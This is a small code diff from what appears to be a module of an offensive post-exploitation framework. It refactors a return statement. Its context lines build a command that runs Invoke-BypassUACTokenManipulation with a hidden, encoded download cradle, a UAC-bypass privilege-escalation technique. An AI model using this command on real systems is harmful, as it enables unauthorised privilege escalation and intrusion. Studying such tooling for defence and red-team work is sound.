@@ -54,10 +54,9 @@ class Module:
             f'Invoke-BypassUACTokenManipulation -Arguments "-w 1 -enc {encoded_cradle}"'
         )
 
-        script = main_menu.modulesv2.finalize_module(
+        return main_menu.modulesv2.finalize_module(
             script=script,
             script_end=script_end,
             obfuscate=obfuscate,
             obfuscation_command=obfuscation_command,
         )
-        return script
